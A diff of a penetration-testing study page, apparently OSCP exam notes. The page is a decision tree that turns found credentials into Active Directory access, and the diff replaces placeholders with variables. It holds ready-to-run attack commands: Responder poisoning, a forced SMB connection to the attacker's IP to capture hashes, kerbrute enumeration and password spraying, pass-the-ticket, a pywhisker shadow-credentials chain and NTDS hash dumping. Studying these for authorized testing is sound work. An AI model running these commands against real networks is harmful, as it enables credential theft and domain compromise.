@@ -9,7 +9,7 @@ Part of [[DECISION TREE]]. "I found X, what do I try" for credentials, hashes, a
 ### Retrieved a private key (or any multi-line secret) through a web vuln
 → Never copy/paste it by hand. Save the raw response to a file and extract with `sed`/`grep`:
 ```bash
-curl -s "<vulnerable-url>" -o raw_response.txt
+curl -s "$BoxIP" -o raw_response.txt
 sed -n '/-----BEGIN.../,/-----END.../p' raw_response.txt > secret_file
 ```
 → Full reasoning: [[09. Common Web Application Attacks#9.1.2. Identifying and Exploiting Directory Traversals|9.1.2]]
@@ -74,7 +74,7 @@ Get-ComputerInfo | Select-Object DeviceGuardSecurityServicesRunning
 
 → Check if Responder is running with `sudo` (needs raw sockets for LLMNR/NBT-NS servers)
 → Check interface name: `sudo responder -I tun0` -- the interface must match your actual VPN (`ip a`)
-→ If the Windows machine uses DNS successfully, LLMNR/NBT-NS poisoning won't fire. You need to trigger a direct SMB connection to your IP: `dir \\<kali-ip>\test` from a shell on the victim
+→ If the Windows machine uses DNS successfully, LLMNR/NBT-NS poisoning won't fire. You need to trigger a direct SMB connection to your IP: `dir \\$LocalIP\test` from a shell on the victim
 → Responder and ntlmrelayx can't both own port 445 at the same time. If running a relay, stop Responder first.
 
 ---
@@ -83,7 +83,7 @@ Get-ComputerInfo | Select-Object DeviceGuardSecurityServicesRunning
 
 → Try forward-slash UNC form first: `//kali-ip/share/file` instead of `\\kali-ip\share\file`
 → On Go's `filepath.Join(uploadDir, filename)` on Windows: `//server/` is treated as an absolute UNC path discarding uploadDir. Backslash form may be filtered; forward slashes often aren't.
-→ Confirm the server does minimal path sanitisation first: `curl http://<target>/nul` → 200 OK (Windows NUL device passes through), `curl http://<target>/aux` → hangs (AUX serial port device). If both fire, the handler isn't sanitising device names, making UNC injection likely viable.
+→ Confirm the server does minimal path sanitisation first: `curl http://$BoxIP/nul` → 200 OK (Windows NUL device passes through), `curl http://$BoxIP/aux` → hangs (AUX serial port device). If both fire, the handler isn't sanitising device names, making UNC injection likely viable.
 → Full story: [[16. Password Attacks#16.3.3. Cracking Net-NTLMv2|16.3.3 VM #2]]
 
 ---
@@ -94,16 +94,16 @@ Get-ComputerInfo | Select-Object DeviceGuardSecurityServicesRunning
 
 → Use **kerbrute** against the DC's Kerberos port (88), no account lockout risk with `userenum`, no auth required:
 ```bash
-kerbrute userenum -d <domain> --dc <DC-IP> /usr/share/wordlists/xato-net-10-million-usernames.txt
+kerbrute userenum -d $Domain --dc $BoxIP /usr/share/wordlists/xato-net-10-million-usernames.txt
 ```
 → Generate realistic username formats from a name list first with **username-anarchy**:
 ```bash
 username-anarchy -i names.txt > candidate_users.txt
-kerbrute userenum -d <domain> --dc <DC-IP> candidate_users.txt
+kerbrute userenum -d $Domain --dc $BoxIP candidate_users.txt
 ```
 → Once you have valid usernames, spray with kerbrute (careful, `bruteuser`/`passwordspray` DO count against lockout policy):
 ```bash
-kerbrute bruteuser -d <domain> --dc <DC-IP> valid_users.txt 'Password123!'
+kerbrute bruteuser -d $Domain --dc $BoxIP valid_users.txt '$Password'
 ```
 → Full reference: [[16. Password Attacks|PA.20]], [[16. Password Attacks|PA.21]]
 
@@ -125,7 +125,7 @@ ls -la /tmp/krb5cc_*               # find existing ccache files
 export KRB5CCNAME=/tmp/krb5cc_<id> # activate it
 smbclient -k -N //target/share     # use it (no password needed)
 ```
-If you have a `.keytab` instead of a `.ccache`: extract with `keytabextract.py <file.keytab>`, then `kinit <user>@DOMAIN` to get a TGT.
+If you have a `.keytab` instead of a `.ccache`: extract with `keytabextract.py $BoxDir`, then `kinit $Username@DOMAIN` to get a TGT.
 
 → Key rule: TGTs let you request any TGS (full impersonation); a TGS only works for the single service it was issued for.
 → Full reference: [[16. Password Attacks|PA.15]], [[16. Password Attacks|PA.16]]
@@ -139,17 +139,17 @@ If you have a `.keytab` instead of a `.ccache`: extract with `keytabextract.py <
 **The chain:**
 ```bash
 # 1. Add shadow credential (requires write access to the object)
-python3 pywhisker.py -d <domain> -u <user> -p <pass> --target <victim-machine$> --action add
+python3 pywhisker.py -d $Domain -u $Username -p $Password --target <victim-machine$> --action add
 
 # 2. Convert the pfx to a format gettgtpkinit.py accepts
 # (pywhisker outputs the pfx password and file path)
 
 # 3. Get TGT via PKINIT
-python3 gettgtpkinit.py <domain>/<victim-machine$> out.ccache -cert-pfx <file.pfx> -pfx-pass <password>
+python3 gettgtpkinit.py $Domain/<victim-machine$> out.ccache -cert-pfx $BoxDir -pfx-pass $Password
 
 # 4. Activate the TGT and use evil-winrm (or smbclient -k, etc.)
 export KRB5CCNAME=out.ccache
-evil-winrm -i <target> -r <domain>
+evil-winrm -i $BoxIP -r $Domain
 ```
 → Prerequisite: oscrypto version pin may be needed (`pip3 install oscrypto==1.3.0`) if you get `ValueError: required TLS connection info not available`.
 → Full reference: [[16. Password Attacks|PA.17]]
@@ -170,7 +170,7 @@ Then exfil both files and crack offline:
 ```bash
 secretsdump.py -ntds NTDS.dit -system SYSTEM LOCAL
 ```
-→ Alternative (remote, one-liner): `nxc smb <target> -u admin -p pass --ntds` runs VSS automatically.
+→ Alternative (remote, one-liner): `nxc smb $BoxIP -u admin -p pass --ntds` runs VSS automatically.
 → Full reference: [[16. Password Attacks|PA.13]]
 
 #### Tags: #DecisionTree #Credentials #PassTheTicket #PassTheCertificate #NTDS #kerbrute #ActiveDirectory
@@ -181,3 +181,14 @@ secretsdump.py -ntds NTDS.dit -system SYSTEM LOCAL
 - [RevShells](https://www.revshells.com/) for shell troubleshooting
 - [CyberChef](https://gchq.github.io/CyberChef/) for transformations
 - [ippsec.rocks](https://ippsec.rocks/) for walkthrough searches
+## Why this matters for OSCP
+
+This page turns one repeatable part of an authorized assessment into a checklist you can apply under exam time pressure.
+
+## Related Modules
+
+- [[MODULES/06. Information Gathering]] -- module concepts used by this hub page
+
+## Demonstrated in box write-ups
+
+- [[OSCP/BOXES/WRITE UPS/AD/Forest|Forest]] -- demonstrates the workflow described here
